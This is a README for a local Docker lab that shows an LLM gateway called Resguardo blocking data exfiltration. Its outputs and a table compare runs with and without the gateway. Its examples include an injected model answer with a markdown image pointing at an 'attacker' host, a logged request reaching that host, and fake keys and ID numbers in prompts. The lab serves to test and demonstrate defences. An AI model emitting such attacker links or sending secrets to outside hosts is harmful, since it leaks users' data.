# Exfiltration lab

The same attack twice: once from an application that can only reach the model through Resguardo, and once from the same application with direct internet access. Everything runs locally with Docker; the "provider" is the mock behind nginx with the lab's own certificate, the "attacker" is a server that logs what it receives, and every secret is fake.

## Run it

```console
$ docker compose -f lab/docker-compose.yml run --rm app
== target: http://resguardo:8787
ok   the application cannot reach the attacker directly
ok   a provider key in the prompt is blocked
ok   the DNI reached the provider as [REDACTED:es_id:1]
ok   the image pointing at the attacker was removed from the answer

$ docker compose -f lab/docker-compose.yml --profile unprotected run --rm app-unprotected
== target: https://provider
LEAK the application reached the attacker directly
LEAK a provider key in the prompt reached the provider
LEAK the DNI reached the provider as written
LEAK the answer carries an image that sends data to the attacker

$ docker compose -f lab/docker-compose.yml logs attacker
attacker-1  | ATTACKER RECEIVED: /direct?d=hello

$ docker compose -f lab/docker-compose.yml exec resguardo \
    resguardo verify-log /data/audit.jsonl --pubkey /data/signing.pub
/data/audit.jsonl: OK (6 entries)

$ docker compose -f lab/docker-compose.yml down -v
```

The protected run exits with 0 and the unprotected one with 1, so a script can tell them apart.

## What it shows

| | Protected | Unprotected |
| --- | --- | --- |
| The application calls the attacker directly | No route: the `internal` network has no way out | Reaches it |
| A provider key in the prompt | `403 SENSITIVE_DATA`, nothing leaves | Reaches the provider |
| A DNI in the prompt | Reaches the provider as `[REDACTED:es_id:1]` | Reaches it as written |
| An injected answer with `![x](http://attacker/…)` | Becomes `[image removed]` | The client would load it |
| Evidence | Signed receipts; `verify-log` checks them | None |

The boundary is the network, not Resguardo alone: the application has no route except through it. That is the deployment the threat model assumes (assumption 1) and [`docs/DEPLOYMENT.md`](../docs/DEPLOYMENT.md) describes.

## How it is built

- `internal` is a Docker network with `internal: true`: no route outside it. The application and Resguardo are on it.
- `outside` holds Resguardo, the provider and the attacker.
- The provider uses HTTPS with a certificate from a lab CA (`certs.sh`). Resguardo trusts it through `SSL_CERT_FILE`, so it checks a certificate like with a real provider and no configuration flag weakens TLS.
- No key is stored in the repository: `setup.sh` creates the application's virtual key, the configuration (from `resguardo.toml.in`) and the signing key pair on first start. `down -v` throws them away.
